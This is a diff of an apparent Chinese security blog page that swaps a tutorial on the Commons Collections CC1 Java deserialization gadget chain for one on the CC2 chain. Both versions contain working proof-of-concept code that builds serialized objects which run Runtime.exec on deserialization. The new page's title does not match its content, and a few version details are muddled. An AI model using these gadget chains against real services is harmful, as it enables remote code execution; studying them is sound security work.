@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">cc链1 | baicany</title>
+  <title itemprop="name">java动态加载字节码 | baicany</title>
   
     <link rel="shortcut icon" href="favicon.ico">
   
@@ -233,11 +233,11 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://baicany.github.io/images/a1.jpg);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://baicany.github.io/images/a1.jpg">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://baicany.github.io/images/a15.jpg);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://baicany.github.io/images/a15.jpg">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      cc链1</h1>
+      java动态加载字节码</h1>
       <p class="entry-census">
         <span>
           <a href="">
@@ -249,7 +249,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2023-7-10<span class="bull">
+        2023-7-12<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -263,268 +263,193 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <h1 id="前提知识点"><a href="#前提知识点" class="headerlink" title="前提知识点"></a>前提知识点</h1><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p><code>Proxy.newProxyInstance</code> 方法用于创建动态代理对象。它接受三个参数：</p>
-<ol>
-<li>ClassLoader：指定用于加载代理类的类加载器。</li>
-<li>interfaces：指定代理类要实现的接口列表。</li>
-<li>invocationHandler：指定代理类的调用处理程序，用于处理代理类的方法调用。</li>
-</ol>
-<pre><code class="java">public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) throws IllegalArgumentException
-</code></pre>
-<p>InvocationHandler也是一个接口需要写出invoke方法</p>
-<pre><code class="java">public Object invoke(Object proxy, Method method, Object[] args)
-        throws Throwable;
-</code></pre>
-<p>当我们调用某个动态代理对象的方法时，都会触发代理类的invoke方法，并传递对应的内容。</p>
-<p>已经学过反射了就不详写了环境要commons-collections : 3.1 TransformedMap - jdk &lt; 8u71</p>
-<h3 id="AbstractMapDecorator"><a href="#AbstractMapDecorator" class="headerlink" title="AbstractMapDecorator"></a>AbstractMapDecorator</h3><p>首先 CC 库中提供了一个抽象类 <code>org.apache.commons.collections.map.AbstractMapDecorator</code>，这个类是 Map 的扩展，并且从名字中可以知道，这是一个基础的装饰器，用来给 map 提供附加功能，被装饰的 map 存在该类的属性中，并且将所有的操作都转发给这个 map。</p>
-<p>这个类有很多实现类，各个类触发的方式不同，重点关注的是</p>
-<p>它的子类 TransformedMap 以及 LazyMap。</p>
-<h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p><code>org.apache.commons.collections.map.TransformedMap</code> 类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由 Transformer 来定义，Transformer 在 TransformedMap 实例化时作为参数传入。也就是说当 TransformedMap 内的 key 或者 value 发生变化时（例如调用 TransformedMap 的 <code>put</code> 方法时），就会触发相应参数的 Transformer 的 <code>transform()</code> 方法。</p>
-<h4 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h4><p><code>org.apache.commons.collections.map.LazyMap</code> 与 TransformedMap 类似，不过差异是调用 <code>get()</code> 方法时如果传入的 key 不存在，则会触发相应参数的 Transformer 的 <code>transform()</code> 方法。</p>
-<p>与 LazyMap 具有相同功能的，是 <code>org.apache.commons.collections.map.DefaultedMap</code>，同样是 <code>get()</code> 方法会触发 transform 方法。</p>
-<h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p><code>org.apache.commons.collections.Transformer</code> 是一个接口，提供了一个 <code>transform()</code> 方法，用来定义具体的转换逻辑。方法接收 Object 类型的 input，处理后将 Object 返回。</p>
-<p>在 Commons Collection 3.2.1 中，程序提供了 14 个 Transformer 的实现类，用来实现不同的对 TransformedMap 中 key/value 进行修改的功能。</p>
-<p>重点关注其中几个实现类。</p>
-<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>这个实现类从 Commons Collections 3.0 引入，功能是使用反射创建一个新对象，我们来看一下它的 transfrom 方法，方法注释写的很清楚，通过反射调用 input 的方法，并将方法返回结果作为处理结果进行返回。</p>
-<pre><code class="java">    //构造函数,也可以传一个参数,也没什么
-   public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;
-        this.iMethodName = methodName;
-        this.iParamTypes = paramTypes;
-        this.iArgs = args;
+          <p>前面分析了CC1的利用链，但是在CC1的利用链中是有版本的限制的。在JDK1.8 8u71版本以后，对<code>AnnotationInvocationHandler</code>的<code>readobject</code>进行了改写。导致高版本中利用链无法使用。</p>
+<p>这就有了其他的利用链，在CC2链里面并不是使用 <code>AnnotationInvocationHandler</code>来构造，而是使用 <code>javassist</code>和<code>PriorityQueue</code>来构造利用链。</p>
+<p>CC2链中使用的是<code>commons-collections-4.0</code>版本，但是CC1在<code>commons-collections-4.0</code>版本中其实能使用，但是<code>commons-collections-4.0</code>版本删除了<code>lazyMap</code>的<code>decode</code>方法，这时候我们可以使用<code>lazyMap</code>方法来代替。但是这里产生了一个疑问，为什么CC2链中使用<code>commons-collections-4.0 </code>3.2.1-3.1版本不能去使用，使用的是<code>commons-collections-4.0</code>4.0的版本？在中间查阅了一些资料，发现在3.1-3.2.1版本中<code>TransformingComparator</code>并没有去实现<code>Serializable</code>接口,也就是说这是不可以被序列化的。所以在利用链上就不能使用他去构造。</p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h3><p>PriorityQueue 优先级队列是基于优先级堆（a priority heap）的一种特殊队列，他给每个元素定义“优先级”，这样取出数据的时候会按照优先级来取。默认情况下，优先级队列会根据自然顺序对元素进行排序。</p>
+<p>因此，放入PriorityQueue的元素，需要实现 Comparable 接口，PriorityQueue 会根据元素的排序顺序决定出队的优先级。如果没有实现 Comparable 接口，PriorityQueue 还允许我们提供一个 Comparator 对象来判断两个元素的顺序。<br>PriorityQueue 支持反序列化，在重写的 readObject 方法中，将数据反序列化到 <code>queue</code> 中之后，会调用 <code>heapify()</code> 方法来对数据进行排序。<code>heapify()</code> 方法调用 <code>siftDown()</code> 方法，在 comparator 属性不为空的情况下，调用 <code>siftDownUsingComparator()</code> 方法</p>
+<p>在 <code>siftDownUsingComparator()</code> 方法中，会调用 comparator 的 <code>compare()</code> 方法来进行优先级的比较和排序。这样，反序列化之后的优先级队列，也拥有了顺序。</p>
+<p>后面会提</p>
+<h3 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h3><p>TransformingComparator 是触发这个漏洞的一个关键点，他将 Transformer 执行点和 PriorityQueue 触发点连接了起来。</p>
+<p>TransformingComparator 看类名就类似 TransformedMap，实际作用也类似，用 Tranformer 来装饰一个 Comparator。也就是说，待比较的值将先使用 Tranformer 转换，再传递给 Comparator 比较。</p>
+<p>TransformingComparator 初始化时配置 Transformer 和 Comparator，如果不指定 Comparator，则使用 <code>ComparableComparator.&lt;Comparable&gt;comparableComparator()</code>。</p>
+<p><img src="https://su18.org/post-images/1626763893534.png" alt="img"></p>
+<p>在调用 TransformingComparator 的 <code>compare</code> 方法时，可以看到调用了 <code>this.transformer.transform()</code> 方法对要比较的两个值进行转换，然后再调用 compare 方法比较。</p>
+<p><img src="https://su18.org/post-images/1626764313782.png" alt="img"></p>
+<h3 id="动态加载字节码"><a href="#动态加载字节码" class="headerlink" title="动态加载字节码"></a>动态加载字节码</h3><p>看之前写的</p>
+<h3 id="javassit"><a href="#javassit" class="headerlink" title="javassit"></a>javassit</h3><pre><code class="java">import javassist.*;
+
+public class javassit_test &#123;
+    public static void createPseson() throws Exception &#123;
+        ClassPool pool = ClassPool.getDefault();
+
+        // 1. 创建一个空类
+        CtClass cc = pool.makeClass(&quot;Person&quot;);
+
+        // 2. 新增一个字段 private String name;
+        // 字段名为name
+        CtField param = new CtField(pool.get(&quot;java.lang.String&quot;), &quot;name&quot;, cc);
+        // 访问级别是 private
+        param.setModifiers(Modifier.PRIVATE);
+        // 初始值是 &quot;xiaoming&quot;
+        cc.addField(param, CtField.Initializer.constant(&quot;xiaoming&quot;));
+
+        // 3. 生成 getter、setter 方法
+        cc.addMethod(CtNewMethod.setter(&quot;setName&quot;, param));
+        cc.addMethod(CtNewMethod.getter(&quot;getName&quot;, param));
+
+        // 4. 添加无参的构造函数
+        CtConstructor cons = new CtConstructor(new CtClass[]&#123;&#125;, cc);
+        cons.setBody(&quot;&#123;name = \&quot;xiaohong\&quot;;&#125;&quot;);
+        cc.addConstructor(cons);
+
+        // 5. 添加有参的构造函数
+        cons = new CtConstructor(new CtClass[]&#123;pool.get(&quot;java.lang.String&quot;)&#125;, cc);
+        // $0=this / $1,$2,$3... 代表方法参数
+        cons.setBody(&quot;&#123;$0.name = $1;&#125;&quot;);
+        cc.addConstructor(cons);
+
+        // 6. 创建一个名为printName方法，无参数，无返回值，输出name值
+        CtMethod ctMethod = new CtMethod(CtClass.voidType, &quot;printName&quot;, new CtClass[]&#123;&#125;, cc);
+        ctMethod.setModifiers(Modifier.PUBLIC);
+        ctMethod.setBody(&quot;&#123;System.out.println(name);&#125;&quot;);
+        cc.addMethod(ctMethod);
+        // 在方法体前插入代码块
+        ctMethod.insertBefore(&quot;&quot;);
+        // 在方法体后插入代码块
+        ctMethod.insertAfter(&quot;&quot;);
+        // 在某行 字节码 后插入代码块
+        ctMethod.insertAt(10, &quot;&quot;);
+        
+
+
+        //这里会将这个创建的类对象编译为.class文件
+        cc.writeFile(&quot;./&quot;);
     &#125;
-    //transform方法
-public Object transform(Object input) &#123;
-        if (input == null) &#123;
-            return null;
-        &#125; else &#123;
-            try &#123;
-                Class cls = input.getClass();
-                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
-                return method.invoke(input, this.iArgs);
-            &#125; catch (NoSuchMethodException var5) &#123;
-                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; does not exist&quot;);
-            &#125; catch (IllegalAccessException var6) &#123;
-                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; cannot be accessed&quot;);
-            &#125; catch (InvocationTargetException var7) &#123;
-                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; threw an exception&quot;, var7);
-            &#125;
+
+    public static void main(String[] args) &#123;
+        try &#123;
+            createPseson();
+        &#125; catch (Exception e) &#123;
+            e.printStackTrace();
         &#125;
     &#125;
 &#125;
 </code></pre>
-<p>分析为什么用了input (传进去对象) 的什么方法</p>
-<pre><code class="java">Class cls = input.getClass();
-Method method = cls.getMethod(this.iMethodName,this.iParamTypes);
-return method.invoke(input, this.iArgs);
+<p>创造了个类</p>
+<p><img src="https://images.seebug.org/content/images/2020/06/11/1591853425000-30yynnp.png-w331s"></p>
+<h1 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h1><pre><code class="java">ObjectInputStream.readObject()
+    PriorityQueue.readObject()
+        PriorityQueue.heapify()
+            PriorityQueue.siftDown()
+                PriorityQueue.siftDownUsingComparator()
+                    TransformingComparator.compare()
+                        InvokerTransformer.transform()
+                                Method.invoke()
+                                    TemplatesImpl.newTransformer()
+                                         TemplatesImpl.getTransletInstance()
+                                         TemplatesImpl.defineTransletClasses():
+                                         newInstance()
+                                            Runtime.exec()
 </code></pre>
-<p>发现通过反射获取可以构造函数初始化的变量方法,（iMethodName）和对应的类型,（iParamTypes）</p>
-<p>构造函数初始化的传入参数（iArgs）作为方法执行的参数</p>
-<h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>其transform方法将输入原封不动的返回：</p>
-<pre><code class="java">//构造函数
-//private final Object iConstant;
-public ConstantTransformer(Object constantToReturn) &#123;
-        this.iConstant = constantToReturn;
-&#125;
-//transform方法
-public Object transform(Object input) &#123;
-        return this.iConstant;
-&#125;
+<h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>后半段链和cc1差不多，所以这里可以正向分析，从readObject来学习整条链。</p>
+<p>PriorityQueue#readObject：</p>
+<pre><code class="java">//   transient Object[] queue; 虽然是 transient但是因为写入的数据后有赋值语句
+//   所以还是改了的queue[i] = s.readObject();也没有它的构造方法
+
+private void readObject(java.io.ObjectInputStream s)
+        throws java.io.IOException, ClassNotFoundException &#123;
+        // Read in size, and any hidden stuff
+        s.defaultReadObject();
+
+        // Read in (and discard) array length
+        s.readInt();
+
+        queue = new Object[size];
+
+        // Read in all elements.
+        for (int i = 0; i &lt; size; i++)
+            queue[i] = s.readObject();
+
+        // Elements are guaranteed to be in &quot;proper order&quot;, but the
+        // spec has never explained what that might be.
+        heapify();
+    &#125;
 </code></pre>
-<p>不管传入的objec是什么都会返回本来的构造函数设置的对象</p>
-<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>其transform方法实现了对每个传入的transformer都调用其transform方法，并将结果作为下一次的输入传递进去：</p>
-<p>上一次返回的object作为下一个参数</p>
-<pre><code class="java">// private final Transformer[] iTransformers; 
-public Object transform(Object object) &#123;
-        for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123;
-            object = this.iTransformers[i].transform(object);
+<p>这里的queue[i]的值是由readObject得到的，也就是说在writeObject处写入了对应的内容：</p>
+<pre><code class="java">    private void writeObject(java.io.ObjectOutputStream s)
+        throws java.io.IOException&#123;
+        // Write out element count, and any hidden stuff
+        s.defaultWriteObject();
+
+        // Write out array length, for compatibility with 1.5 version
+        s.writeInt(Math.max(2, size + 1));
+
+        // Write out all elements in the &quot;proper order&quot;.
+        for (int i = 0; i &lt; size; i++)
+            s.writeObject(queue[i]);
+    &#125;
+</code></pre>
+<p>也就是说我们可以通过反射来设置queue[i]的值来达到控制queue[i]内容的目的。</p>
+<p>在readObject处调用了heapify：</p>
+<p>这里的queue[i]是我们可控的。</p>
+<pre><code class="java">  private void heapify() &#123;
+        for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)
+            siftDown(i, (E) queue[i]);
+    &#125;
+</code></pre>
+<p>跟进siftdown</p>
+<pre><code class="java">//private final Comparator&lt;? super E&gt; comparator;
+    private void siftDown(int k, E x) &#123;
+        if (comparator != null)
+            siftDownUsingComparator(k, x);
+        else
+            siftDownComparable(k, x);//一个普通的比较器
+    &#125;
+</code></pre>
+<p>这里的x是我们可控的，跟入第一个siftDownUsingComparator：</p>
+<pre><code class="java">    private void siftDownUsingComparator(int k, E x) &#123;
+        int half = size &gt;&gt;&gt; 1;
+        while (k &lt; half) &#123;
+            int child = (k &lt;&lt; 1) + 1;
+            Object c = queue[child];
+            int right = child + 1;
+            if (right &lt; size &amp;&amp;
+                comparator.compare((E) c, (E) queue[right]) &gt; 0)
+                c = queue[child = right];
+            if (comparator.compare(x, (E) c) &lt;= 0)
+                break;
+            queue[k] = c;
+            k = child;
         &#125;
-
-        return object;
+        queue[k] = x;
     &#125;
 </code></pre>
-<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><pre><code class="java">//Runtime类的对象能使用方法exec()来命令执行，但是Runtime类的构造方法是私有的所以可以获取类
-public static Runtime getRuntime() &#123;
-        return currentRuntime;
-    &#125;
-
-private static Runtime currentRuntime = new Runtime();
+<p>重点：</p>
+<pre><code class="java">comparator.compare(x, (E) c)
 </code></pre>
-<p>由这三个transformer组合起来，即可实现任意命令执行：</p>
-<pre><code class="java">import org.apache.commons.collections.Transformer;
-import org.apache.commons.collections.functors.*;
-
-public class cc1 &#123;
-
-     public static void main(String[] args)&#123;
-          ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;
-                  new ConstantTransformer(Runtime.class),
-                  new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;
-                          String.class, Class[].class &#125;, new Object[] &#123;
-                          &quot;getRuntime&quot;, new Class[0] &#125;),
-                  new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;
-                          Object.class, Object[].class &#125;, new Object[] &#123;
-                          null, new Object[0] &#125;),
-                  new InvokerTransformer(&quot;exec&quot;,
-                          new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;);
-          chain.transform(123);
-     &#125;
-&#125;
-</code></pre>
-<p>分析:</p>
-<pre><code class="java">/*
-入口点是chain.transform(123);进入ChainedTransformer类transform方法怎么用的看上面 传入123
-第一个transformer对象是 ConstantTransformer 传入123也只会返回 Runtime.class
-第二个transformer对象是 InvokerTransformer  传入Runtime.class作为input 所以使用了Runtime.class.getMethod方法 参数是 getRuntime 和一个null(后面再说) 所以返回了 Menthod Runtime.getRuntime
-第三个transformer对象是 InvokerTransformer  传入Menthod Runtime.getRuntime 所以使用了 Menthod的invoke方法学反射时候就已经学了menthod.invoke(object,args)(因为是静态static所以null) 所以使用了方法 getRuntime()返回了一个Runtime的对象了
-第三个transformer对象是 InvokerTransformer  传入Runtime对象 所以使用了Runtime.exec()方法 参数是是calc
-</code></pre>
-<pre><code class="java">Object constantTransformer = new ConstantTransformer(Runtime.getRuntime()).transform(123);
-Transformer invoketransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);
-invoketransformer.transform(constantTransformer);
-</code></pre>
-<p>看看简单代码搭配ChainedTransformer是这样的：</p>
-<pre><code class="java">     public void test()&#123;
-          ChainedTransformer chain = new ChainedTransformer(new Transformer[]&#123;
-                  new ConstantTransformer(Runtime.getRuntime()),
-                  new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
-
-          &#125;);
-          chain.transform(123);
-     &#125;
-</code></pre>
-<p>此时只要ChainedTransformer反序列化后调用transform方法并传递任意内容即可实现rce，但是当尝试去序列化的时候，发生了一个问题：</p>
-<p>因为这里的Runtime.getRuntime()返回的是一个Runtime的实例，而Runtime并没有继承Serializable，所以这里会序列化失败。</p>
-<p>那么我们就需要找到一个方法来获取到Runtime.getRuntime()返回的结果，并将其传入invoketransformer的transform方法中。这就有了上边那条链。</p>
-<p>上面说了，其transform方法是将输入的Object原封不动的返回回去，那么我们是不是可以尝试这么搭配：</p>
-<p>这里通过InvokerTransformer来实现了一次反射，即通过反射来反射，先是调用getMethod方法获取了getRuntime这个Method对象，接着又通过Invoke获取getRuntime的执行结果。</p>
-<p>这里我一开始看Class[].class以及new Class[0]。这里尝试通过反射去调用getMethod方法，而getMethod的定义如下：</p>
-<p><img src="https://baicany.github.io/images/1591853.jpg" alt="-w903"></p>
-<p>这里需要传入一个name也就是要调用的方法名，接着需要传递一个可变参数，所以这里的Class[].class，其实就是对应着这里的可变参数，即使我们不需要传递参数，也需要在这里加一个Class[].class，后边再加一个new Class[0]起到占位的作用。也可以用null</p>
-<p>目前已经构造到只需要反序列化后调用transform方法，并传递任意内容即可rce。我们的目的是在调用readObject的时候就触发rce，也就是说我们现在需要找到一个点调用了transform方法（如果能找到在readObject后就调用那是最好的），如果找不到在readObject里调用transform方法，那么就需要找到一条链，在readObject触发起点，接着一步步调用到了transform方法。</p>
-<h1 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h1><pre><code class="java">ObjectInputStream.readObject()-&gt; 
-AnnotationInvocationHandler.readObject()  -&gt; AnnotationInvocationHandler(Proxy).entrySet()-&gt;
-AnnotationInvocationHandler.invoke()-&gt;
-lazymap.get-&gt;
-factory.transform(key)
-
-ObjectInputStream.readObject()-&gt; 
-AnnotationInvocationHandler.readObject()  -&gt; 
-/*过程理解
-Transformed.EntrySet()-&gt;
-AbstractInputCheckedMapDecorator.EntrySet()-&gt;
-Transformed.isSetValueChecking()-&gt;
-AbstractInputCheckedMapDecorator.EntrySet(x,y)-&gt;
-AbstractInputCheckedMapDecorator.EntrySet.iterator()-&gt;
-AbstractInputCheckedMapDecorator.EntrySetIterator.next()-&gt;
-var5=AbstractInputCheckedMapDecorator.MapEntry*/
-AbstractInputCheckedMapDecorator.MapEntry.setValue() -&gt;
-TransformedMap.checkSetValue()-&gt;
-valueTransformer.transform(value)-&gt;
-</code></pre>
-<h1 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h1><h4 id="Lazymap"><a href="#Lazymap" class="headerlink" title="Lazymap"></a>Lazymap</h4><p>Lazymap#get这个方法：</p>
-<p><img src="https://baicany.github.io/images/1591853423000.png" alt="-w611"></p>
-<p>如果这里的this.factory可控，那么我们就可以通过LazyMap来延长我们的链，下一步就是找哪里调用了get方法了</p>
-<pre><code>protected final Transformer factory;
-</code></pre>
-<p>这里的factory并没有被transient以及static关键字修饰，所以是我们可控的，并且由于factory是在类初始化时定义的，所以我们可以通过创建LazyMap实例的方式来设置他的值。并且这里需要初始化的map没有包含传入的键名    (后面说)</p>
-<p><img src="https://baicany.github.io/images/1591853423000-21embjd.png" alt="-w652"></p>
-<p>但是这里的构造方法并不是public的，所以可以通过反射的方式来获取到这个构造方法，再创建其实例。</p>
-<pre><code class="java">//通过get来执行命令
-public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException &#123;
-          ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;
-                  new ConstantTransformer(Runtime.class),
-                  new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;
-                          String.class, Class[].class &#125;, new Object[] &#123;
-                          &quot;getRuntime&quot;, new Class[0] &#125;),
-                  new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;
-                          Object.class, Object[].class &#125;, new Object[] &#123;
-                          null, new Object[0] &#125;),
-                  new InvokerTransformer(&quot;exec&quot;,
-                          new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;);
-          HashMap innermap = new HashMap();
-          Class clazz = Class.forName(&quot;org.apache.commons.collections.map.LazyMap&quot;);
-          Constructor[] constructors = clazz.getDeclaredConstructors();
-          Constructor constructor = constructors[0];
-          constructor.setAccessible(true);
-          LazyMap map = (LazyMap)constructor.newInstance(innermap,chain);
-          map.get(123);
-     &#125;
-</code></pre>
-<p>接着我们需要找到某个地方调用了get方法，并且传递了任意值。通过学习了上边动态代理的知识，我们可以开始分析cc1的前半段链了。</p>
-<p>入口时AnnotationInvocationHandler的readObject：</p>
-<p><img src="https://baicany.github.io/images/1626682224442.png" alt="img"></p>
-<p>首先调用 <code>AnnotationType.getInstance(this.type)</code>(后面提到) </p>
-<pre><code class="java"> private final Class&lt;? extends Annotation&gt; type;
-自己简单想一下就知道如果要进入if(var7!=null)就知道了提这里干嘛了
-</code></pre>
-<p>来获取 type 这个注解类对应的 AnnotationType 的对象，然后获取其 memberTypes 属性，这个属性是个 Map，存放这个注解中可以配置的值。</p>
-<pre><code class="Java">//AnnotationType   
-  public Map&lt;String, Class&lt;?&gt;&gt; memberTypes() &#123;
-        return this.memberTypes;
-    &#125;
-</code></pre>
-<p>重点是这里Iterator var4 = this.memberValues.entrySet().iterator();</p>
-<p>memberValues需要这里定义是map但是如果其具体实现类是 Java 运行时生成的动态代理类。通过代理对象调用自定义注解（接口）的方法，会最终调用 AnnotationInvocationHandler 的 invoke 方法。该方法会从 memberValues 这个 Map 中索引出对应的值。</p>
-<p>简单来说</p>
-<p>这里的readObject又调用了this.memberValues的entrySet方法。如果这里的memberValues是个代理类，那么就会调用memberValues对应handler的invoke方法，cc1中将handler设置为AnnotationInvocationHandler（其实现了InvocationHandler，所以可以被设置为代理类的handler）。不能理解就自己多调试吧</p>
-<pre><code class="java">//学过反射的你一定知道这里的参数是什么
-public Object invoke(Object var1, Method var2, Object[] var3) &#123;
-        String var4 = var2.getName();
-        Class[] var5 = var2.getParameterTypes();
-        if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) &#123;
-            return this.equalsImpl(var3[0]);
-        &#125; else if (var5.length != 0) &#123;
-            throw new AssertionError(&quot;Too many parameters for an annotation method&quot;);
-        &#125; else &#123;
-            byte var7 = -1;
-            switch(var4.hashCode()) &#123;
-            case -1776922004:
-                if (var4.equals(&quot;toString&quot;)) &#123;
-                    var7 = 0;
-                &#125;
-                break;
-            case 147696667:
-                if (var4.equals(&quot;hashCode&quot;)) &#123;
-                    var7 = 1;
-                &#125;
-                break;
-            case 1444986633:
-                if (var4.equals(&quot;annotationType&quot;)) &#123;
-                    var7 = 2;
-                &#125;
-            &#125;
-
-            switch(var7) &#123;
-            case 0:
-                return this.toStringImpl();
-            case 1:
-                return this.hashCodeImpl();
-            case 2:
-                return this.type;
-            default:
-                Object var6 = this.memberValues.get(var4);
-                    ...
-</code></pre>
-<p>这里对this.memberValues调用了get方法，如果此时this.memberValues为我们的lazymap，那么就会触发LazyMap#get，从而完成触发rce。</p>
-<p>完整POC：</p>
-<pre><code class="java">import org.apache.commons.collections.Transformer;
-import org.apache.commons.collections.functors.*;
-import org.apache.commons.collections.map.LazyMap;
-
-
-import java.io.FileInputStream;
+<p>这里的x是我们可控的，cc2中使用了TransformingComparator#compare来触发后续链，看一下这个方法：</p>
+<p><img src="https://images.seebug.org/content/images/2020/06/11/1591853426000-31stixm.png-w331s" alt="-w562"></p>
+<p>可以发现，这里对this.transformer调用了transform方法，如果这个this.transformer可控的话，就可以触发cc1中的后半段链。</p>
+<p><img src="https://images.seebug.org/content/images/2020/06/11/1591853426000-32iwklv.png-w331s" alt="-w906"></p>
+<p>从上图可以看出，this.transformer并没有被static或transient修饰，所以是我们可控的。</p>
+<p>构造POC：</p>
+<pre><code class="java">import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
-import java.lang.annotation.Target;
-import java.lang.reflect.*;
-import java.util.HashMap;
-import java.util.Map;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
 
-public class Main &#123;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
 
-    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException &#123;
+public class cc2 &#123;
+
+    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;
         ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123;
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;
@@ -535,31 +460,23 @@ public class Main &#123;
                         null, new Object[0] &#125;),
                 new InvokerTransformer(&quot;exec&quot;,
                         new Class[] &#123; String.class &#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;);
-        HashMap innermap = new HashMap();
-//        Class clazz = Class.forName(&quot;org.apache.commons.collections.map.LazyMap&quot;);
-//        Constructor[] constructors = clazz.getDeclaredConstructors();
-//        Constructor constructor = constructors[0];
-//        constructor.setAccessible(true);
-//        Map map = (Map)constructor.newInstance(innermap,chain);
-          Map map = LazyMap.decorate(innermap,chain);
 
-        Constructor handler_constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class,Map.class);
-        handler_constructor.setAccessible(true);
-        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler
+        TransformingComparator comparator = new TransformingComparator(chain);
+        PriorityQueue queue = new PriorityQueue(1);
+        
+        queue.add(1);
+        queue.add(2);
 
-        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]&#123;Map.class&#125;,map_handler); //创建proxy对象
-
-//分开名字方便理解
-        Constructor AnnotationInvocationHandler_Constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class,Map.class);
-        AnnotationInvocationHandler_Constructor.setAccessible(true);
-        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Target.class,proxy_map);
+        Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
+        field.setAccessible(true);
+        field.set(queue,comparator);
 
         try&#123;
-            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;cc1.txt&quot;));
-            outputStream.writeObject(handler);
+            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;cc2.txt&quot;));
+            outputStream.writeObject(queue);
             outputStream.close();
 
-            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;cc1.txt&quot;));
+            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;cc2.txt&quot;));
